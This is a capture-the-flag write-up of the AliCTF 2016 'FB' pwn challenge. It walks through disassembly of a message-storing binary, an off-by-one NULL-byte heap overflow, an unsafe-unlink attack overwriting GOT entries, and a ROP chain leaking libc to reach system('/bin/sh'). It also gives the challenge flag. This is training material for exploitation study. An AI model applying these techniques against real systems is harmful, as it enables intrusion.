## AliCTF 2016 - FB (Pwn 200)
##### 04-06/06/2016 (48hr)
___

### Description: 
[ FB ] Please leave a message. (attachment)

nc 114.55.103.213 9733

nc 121.40.56.102 9733
___
### Solution

In this challenge we'll see how it's possible a simple off-by-one error that can overflow only a
single byte with a NULL, to lead in a successful heap exploitation.

The binary was fairly easy to analyze. Program works as follows:
It keeps a global arrray at .bss:0x6020C0. Let's call this array Q. Each element corresponds to a
message and is a struct of 2 fields: a pointer to the message and the message size. There is also
a counter for that array at .bss:00x6020B4, which prevents any overflows/underflows.

User can only set and delete messages, but he cannot read them. This means that cannnot have 
arbitrary reads (of course we can, but it's not trivial :P).

Let's have a more detailed look: main() iterates over a simple menu:
```
    Welcome to Alibaba Living Area, here you can
    1. Init the message
    2. Set the message
    3. Delete the message
    4. Show the message
    5. Exit
```

There's a simple switch loop which executes a different function according to the selected choice.
First is the function for initializing a message. Function first checks whether there are enough
entries in Q:

```assembly
.text:00000000004009CA     mov     eax, cs:msg_counter_6020B4
.text:00000000004009D0     test    eax, eax
.text:00000000004009D2     js      short TOO_FEW_MSGs_4009DF
.text:00000000004009D4     mov     eax, cs:msg_counter_6020B4
.text:00000000004009DA     cmp     eax, 0Fh
.text:00000000004009DD     jle     short loc_4009F3
```

Then it ask from user for the message size (it must be between 0 and 256 bytes)
```assembly
.text:00000000004009F3     mov     edi, offset aInputTheMessag ; "Input the message length:"
.text:00000000004009F8     mov     eax, 0
.text:00000000004009FD     call    _printf
.text:0000000000400A02     mov     eax, 0
.text:0000000000400A07     call    read_int_4008FC
.text:0000000000400A0C     mov     [rbp+len_C], eax            ; len must be between 0 and 256 chars
.text:0000000000400A0F     cmp     [rbp+len_C], 0
.text:0000000000400A13     js      short INVALID_LEN_400A1E
.text:0000000000400A15     cmp     [rbp+len_C], 100h
.text:0000000000400A1C     jle     short loc_400A2F
```

If size is valid, malloc() is called to reserve a suiltable space for the message. Once we do that,
we should store the pointer and its size into Q. The algorithm here iterates over Q until it finds
an entry that has a zero size. Then it stores message in that slot and updates counter:
```assembly
.text:0000000000400A42 NEXT_ELT_400A42:                        ; CODE XREF: init_msg_4009B4+A8j
.text:0000000000400A42     add     [rbp+iterator_10], 1
.text:0000000000400A46
.text:0000000000400A46 loc_400A46:                             ; CODE XREF: init_msg_4009B4+8Cj
.text:0000000000400A46     mov     eax, [rbp+iterator_10]
.text:0000000000400A49     cdqe
.text:0000000000400A4B     shl     rax, 4
.text:0000000000400A4F     add     rax, 6020C0h
.text:0000000000400A55     mov     rax, [rax+8]                ; check if len is 0
.text:0000000000400A59     test    rax, rax
.text:0000000000400A5C     jg      short NEXT_ELT_400A42       ; find the first empty slot
.text:0000000000400A5E     mov     rax, [rbp+msg_8]
.text:0000000000400A62     mov     edx, [rbp+iterator_10]
.text:0000000000400A65     movsxd  rdx, edx
.text:0000000000400A68     shl     rdx, 4
.text:0000000000400A6C     add     rdx, 6020C0h
.text:0000000000400A73     mov     [rdx], rax                  ; write message pointer
.text:0000000000400A76     mov     eax, [rbp+len_C]
.text:0000000000400A79     cdqe
.text:0000000000400A7B     mov     edx, [rbp+iterator_10]
.text:0000000000400A7E     movsxd  rdx, edx
.text:0000000000400A81     shl     rdx, 4
.text:0000000000400A85     add     rdx, 6020C0h
.text:0000000000400A8C     mov     [rdx+8], rax                ; write message length
.text:0000000000400A90     mov     eax, cs:msg_counter_6020B4  ; msg_counter++
.text:0000000000400A96     add     eax, 1
.text:0000000000400A99     mov     cs:msg_counter_6020B4, eax
```

Note that there's a flaw here: A message can have zero length. In that case, the entry in Q
will contain a message but it will appear as empty. Thus it's possible to make the counter
inconsistent with the real number of elements in Q. However this is not exploitable.

Once a message is initialized, user can set its contents. It first gives the index of the message
(function checks if it's between 0 and 16). If index is valid, function overwrites message contents:
```assembly
.text:0000000000400AF1     mov     eax, [rbp+index_4]
.text:0000000000400AF4     cdqe
.text:0000000000400AF6     shl     rax, 4
.text:0000000000400AFA     add     rax, 6020C0h
.text:0000000000400B00     mov     rax, [rax+8]                ; access elemenet
.text:0000000000400B04     test    rax, rax                    ; check length to see if elt is used
.text:0000000000400B07     jle     short INVALID_INDEX_400B5A
.text:0000000000400B09     mov     edi, offset aInputTheMess_1 ; "Input the message content:"
.text:0000000000400B0E     mov     eax, 0
.text:0000000000400B13     call    _printf
.text:0000000000400B18     mov     eax, [rbp+index_4]
.text:0000000000400B1B     cdqe
.text:0000000000400B1D     shl     rax, 4
.text:0000000000400B21     add     rax, 6020C0h
.text:0000000000400B27     mov     rax, [rax+8]
.text:0000000000400B2B     mov     edx, eax
.text:0000000000400B2D     mov     eax, [rbp+index_4]
.text:0000000000400B30     cdqe
.text:0000000000400B32     shl     rax, 4
.text:0000000000400B36     add     rax, 6020C0h
.text:0000000000400B3C     mov     rax, [rax]
.text:0000000000400B3F     mov     esi, edx                    ; arg2: len
.text:0000000000400B41     mov     rdi, rax                    ; arg1: buf
.text:0000000000400B44     call    read_raw_input_40085D
```

Delete message on the other hand deletes a message and frees the corresponding slot in Q. As before,
it takes the message index (which is checked to be between 0 and 16), and then deletes the message.
In order to delete a message, index must be valid (Q[index] must have a non-zero size):
```assembly
.text:0000000000400BAC     mov     eax, [rbp+index_4]
.text:0000000000400BAF     cdqe
.text:0000000000400BB1     shl     rax, 4
.text:0000000000400BB5     add     rax, 6020C0h
.text:0000000000400BBB     mov     rax, [rax+8]
.text:0000000000400BBF     test    rax, rax                    ; check if len is 0
.text:0000000000400BC2     jle     short INVALID_INDEX_400C15
.text:0000000000400BC4     mov     eax, [rbp+index_4]
.text:0000000000400BC7     cdqe
.text:0000000000400BC9     shl     rax, 4
.text:0000000000400BCD     add     rax, 6020C0h
.text:0000000000400BD3     mov     qword ptr [rax+8], 0        ; clear len
.text:0000000000400BDB     mov     eax, [rbp+index_4]
.text:0000000000400BDE     cdqe
.text:0000000000400BE0     shl     rax, 4
.text:0000000000400BE4     add     rax, 6020C0h
.text:0000000000400BEA     mov     rax, [rax]
.text:0000000000400BED     mov     rdi, rax                    ; ptr
.text:0000000000400BF0     call    _free                       ; free memory
.text:0000000000400BF5     mov     eax, cs:msg_counter_6020B4
.text:0000000000400BFB     sub     eax, 1                      ; msg_counter--
.text:0000000000400BFE     mov     cs:msg_counter_6020B4, eax
.text:0000000000400C04     mov     edi, offset aDone           ; "Done~!"
.text:0000000000400C09     call    _puts
```

There's a small problem here: Message pointer does not set to NULL after free, so it can lead to UAF 
conditions. A message cannot be displayed, even though there's a function for "showing" a message:
```assembly
.text:0000000000400C26     push    rbp
.text:0000000000400C27     mov     rbp, rsp
.text:0000000000400C2A     mov     edi, offset aNotAllow       ; "Not allow~!"
.text:0000000000400C2F     call    _puts
.text:0000000000400C34     pop     rbp
.text:0000000000400C35     retn
```

We'll use this function later in our exploit, so it's important. 

These are the basic functions; there are also some auxiliary functions like read_int_4008FC
with obvious use:
```assembly
.text:000000000040091F     mov     esi, 8                      ; read 8 digits
.text:0000000000400924     mov     rdi, rax
.text:0000000000400927     call    read_raw_input_40085D
.text:000000000040092C     lea     rax, [rbp+nptr]
.text:0000000000400930     mov     rdi, rax                    ; nptr
.text:0000000000400933     call    _atoi
```

As you can see this function simply calls read_raw_input_40085D, which takes 2 arguments,
a buffer and it's size and writes some data from stdin to that buffer.

### The vulnerability 

At a first glance binary seems unexploitable; There are bound checks everywhere, both in messages
and in Q. However there's a small detail that it's hard to observe: read_raw_input_40085D has an
off by one bug. This function repeatedly calls read(0, &buf, 1), until max size is reached or a
a newline is read. In the latter case, the newline is replaced with a NULL byte.

If the buffer is e.g. 8 bytes long, then read() will be called 8 times, writing 1 byte each time.
Then it will finish with a newline as the 9th character. This 9th character will be set to NULL.
So it's possible to overflow and write a NULL byte immediately after the original buffer.

But is this enough to exploit the binary? The obvious answer is no, but we can use it to tamper
heap's metadata and get an arbitrary write primitive.

### Overflowing the heap

I'll assume that reader is familiar with slab allocator and heap exploitation techniques, so I 
won't get into much detail on how and why these attacks work.

When we allocate some memory on the heap, the size is rounded up to double word size, in order
to include heap's metadata. The first step is to initialize a message in the heap with size equal
with the allocated size. If we initialize a message of size 24, the allocated chunk will be 24 
bytes. If we do that we can overwrite heap metadata of the next chunk.

Message size can be between 0 and 256 (0x100) bytes. If we allocate a large message (~248 bytes)
the "size" of the chunk's metadata will be 0x101 (the LSBit indicates that the previous chunk
is in use). If we can overflow the previous chunk, then we can modify its size to 0x100. This
means that we can make slab allocator thinks that previous chunk is free.

Because previous chunk will appear as free, we can set prev_size acconrdingly with a small
value to point somewher in a previous message (or we can give it a negative value to
make it point in current chunk; this approach is not very useful in our attack though).

When free() is invoked, it will try to coalesce current chunk with the previous and next chunks
(if they're free). Because the previous chunk will apear as free, unlink() will be called to 
remove previous chunk from freelist. Then current chunk's size will be updated to include previous \
chunk's size and will be inserted back to the free list.

However, in order to carry out these attacks, all chunks must be in smallbins. If chunk's size
is less than 0x80 bytes it will be on fastbins, where things don't work this way.

Ok, let's set up our attack. First we allocate 4 chunks:
```
+---------------+---------------+----------+------------------------------------------------+
|   128 bytes   |   128 bytes   | 24 bytes |                   248 bytes                    |
+---------------+---------------+----------+------------------------------------------------+
```

and we delete the first chunk, because we don't want the 4th chunk to be on the head of the
freelist during free(). After that, heap will be like this:
```
00603000  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00
00603010  78 66 DD F7 FF 7F 00 00  78 66 DD F7 FF 7F 00 00
00603020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603090  90 00 00 00 00 00 00 00  90 00 00 00 00 00 00 00
006030A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603120  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00
00603130  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603140  00 00 00 00 00 00 00 00  01 01 00 00 00 00 00 00
00603150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603240  00 00 00 00 00 00 00 00  C1 0D 02 00 00 00 00 00
```

Then we overflow 3rd chunk (the 24 byte one) and we change size of 4th chunk from 0x101 to 
0x100. Also we set prev_size of that chunk to 0xa0, to point somewhere in the 2nd chunk.
The heap will become:
```
00603000  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00
00603010  78 66 DD F7 FF 7F 00 00  78 66 DD F7 FF 7F 00 00
00603020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603090  90 00 00 00 00 00 00 00  90 00 00 00 00 00 00 00
006030A0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
006030B0  B8 20 60 00 00 00 00 00  C0 20 60 00 00 00 00 00
006030C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603120  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00
00603130  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
00603140  A0 00 00 00 00 00 00 00  00 01 00 00 00 00 00 00
00603150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
........
00603230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00603240  00 00 00 00 00 00 00 00  C1 0D 02 00 00 00 00 00
```

Finally we set the fd and bk pointers (in the 2nd message) to point somewhere in Q, and then 
we trigger unlink() by deleting 4th chunk. Let's dig into free() internals, to see how unlink() works:
```assembly
libc_2.19.so:00007FFFF7AAC223 rbx = chunk's header
libc_2.19.so:00007FFFF7AAC223
libc_2.19.so:00007FFFF7AAC223 do_unlink_7FFFF7AAC223:
libc_2.19.so:00007FFFF7AAC223     test    byte ptr [rbx+8], 1         ; check if previous chunk is used (0x100 -> no)
libc_2.19.so:00007FFFF7AAC227     jnz     short SKIP_7FFFF7AAC26D     ; if so, don't unlink
libc_2.19.so:00007FFFF7AAC229     mov     rax, [rbx]                  ; rax = prev_size = 0xa0
libc_2.19.so:00007FFFF7AAC22C     sub     rbx, rax                    ; rbx = previous chunk = 0x6030a0
libc_2.19.so:00007FFFF7AAC22F     add     rbp, rax                    ; current chunk's size = 0x100 + 0xa0
libc_2.19.so:00007FFFF7AAC232     mov     rax, [rbx+10h]              ; rax = fd = 0x6020b8
libc_2.19.so:00007FFFF7AAC236     mov     rdx, [rbx+18h]              ; rdx = bk = 0x6020c0
libc_2.19.so:00007FFFF7AAC23A     cmp     rbx, [rax+18h]              ; rbx (= P = 0x6030A0) == *(0x6020b8 + 0x18) = *0x6020d0 ?
libc_2.19.so:00007FFFF7AAC23E     jnz     CORRUPTED_7FFFF7AACA84      ; if not freelist is corrupted
libc_2.19.so:00007FFFF7AAC244     cmp     rbx, [rdx+10h]              ; rbx (= P = 0x6030A0) == *(0x6020c0 + 0x10) = *0x6020d0 ?
libc_2.19.so:00007FFFF7AAC248     jnz     CORRUPTED_7FFFF7AACA84      ; if not freelist is corrupted
libc_2.19.so:00007FFFF7AAC24E     cmp     qword ptr [rbx+8], 3FFh     ; check if chunk it's in smallbins
libc_2.19.so:00007FFFF7AAC256     mov     [rax+18h], rdx              ; *0x6020d0 = 0x6020c0
libc_2.19.so:00007FFFF7AAC25A     mov     [rdx+10h], rax              ; *0x6020d0 = 0x6020b8
libc_2.19.so:00007FFFF7AAC25E     jbe     short SKIP_7FFFF7AAC26D
libc_2.19.so:00007FFFF7AAC260     mov     rdx, [rbx+20h]              ; ignore that stuff
libc_2.19.so:00007FFFF7AAC264     test    rdx, rdx
libc_2.19.so:00007FFFF7AAC267     jnz     loc_7FFFF7AACA58
libc_2.19.so:00007FFFF7AAC26D
libc_2.19.so:00007FFFF7AAC26D SKIP_7FFFF7AAC26D:
...
```

During unlink we have the following writes:
```
    FD->bk = BK
    BK->fd = FD
```
However unlink() got hardened, by adding a check before removing an element from freelist: 
```
    FD->bk != P || BK->fd != P
```

This means that we have to find an address that points to the current chunk. This is easy
because Q[1] points to that chunk. So we set fd = 0x6020b8 and bk = 0x6020c0. During unlink:
```
    FD->bk == 0x6020b8 + 0x18 = 0x6020d0
    BK->fd == 0x6020c0 + 0x10 = 0x6020d0
```
which can pass the check. After unlink we'll have:
```
    FD->bk = BK     -->     *0x6020d0 = 0x6020c0
    BK->fd = FD     -->     *0x6020d0 = 0x6020b8
```

What we did here? Q[1] now is 0x6020b8. This means that if we set message 1 again, we can
overwrite the contents of Q! So, we set pointers of Q with the addresses that we want to 
write (entries in .got table) and then set the message again to write our values. This
can give us the arbitrary write primitive.

After that we set the following pointers in Q (we also and proper sizes):
```
    Q[0] = .got.__stack_chk_fail()
    Q[1] = .got.atoi()  
    Q[2] = .got.free()
```

And we do the follwing replacements:
```
    .got.__stack_chk_fail()     =>  show_msg_400C26
    .got.atoi()                 =>  read_raw_input_40085D
    .got.free()                 =>  system() (we don't know it yet)
```

### Switching to ROP

Ok so far we can have arbitrary writes, but we don't know the address of system(). My first 
approach was to do a return to dl-resolve. However ELF header was R+X so I had to create fake
ELF_rel and ELF_sym entries to do this attack. Unfortunately this didn't work because, the 
large indices I used for my fake structs were invalid when they were used for versioning, so
a seg fault happened (this is a problem of return to dl-resolve; it doesn't work always).

Clearly we need to leak an address. Things would be easy if show_message was implemented, but
we need another way. Functions like printf() and puts() are already there, so can use them
by supplying our arguments to force them print the value of any address that we want.

This is very easy to do using ROP, but unfortunately everything happens on the heap :\

The solution here is observe that function read_int_4008FC() calls read_raw_input_40085D() with
a buffer on the stack. By overwriting .got.atoi() with read_raw_input_40085D(), whe can call
read_raw_input_40085D() we a buffer on the stack, with a very large size (the size will actually
be another stack address, but it will be very large so we can overflow).

This way we can overflow the stack and start ROPing. But there's one problem here:
```assembly
    .text:0000000000400947    call    ___stack_chk_fail
```

This is the reason that we replace canary check with show_msg_400C26(). Even if canary check
fails, nothing bad happens. Now we can start ROPing.

### Leaking an address

Once we start ROPing leaking address is trivial. All we need is a "pop rdi; ret" gadget and a 
return to puts(). The only problem here is that puts() stops on NULL byte, but this does not
affect us.

So let's see the ROP chain:
```python
    rop  = pack('<Q', 0x4444444444444444)       # set rbp
    rop += pack('<Q', 0x0000000000400D83)       # pop rdi; ret; gadget
    rop += pack('<Q', addr)                     # address to leak
    rop += pack('<Q', 0x0000000000400957)       # return to puts()
```

The good news are that we can repeat this as many times as we want, so we can leak any number
of addresses. The ROP chain ends with a return to main().

After that we can leak address of alarm() or printf() and calculate address of system(). But
we need to know the exact version of libc. After a few tries I found that it's 2.19.

### Putting all together

So far we have an arbitrary read/write primitive and we know address of system(). The final
step is to write this address in .got.free() and trigger it with the /bin/sh argument.

Address of .got.free() is still in Q[2], so all we have to do is to set the message with index 2.

Because atoi() is overwritten with read_raw_input_40085D() we need to be more careful when 
read_int_4008FC() is called. In order to control its return value, we need to supply a random
string first to satisfy the first call to read_raw_input_40085D() and then send a string which is
K characters long, to get a return value of K.

For example if we want read_int_4008FC() to return 2 we send: '\n' + 'kk' + '\n' (a dummy \n +
2 characters). If we want to return 5 we send: '\n' + 'kkkkk' + '\n', and so on.

So we set message #2 with the address of system(), and then we delete message #5. Message #5
contains the address of /bin/sh in .bss (which is not PIE). When free(Q[5].ptr) is called
the real call is system("/bin/sh"). Game Over.

Once we successfully get this attack, we can get our reward: **alictf{FBfbFbfB23666}**

___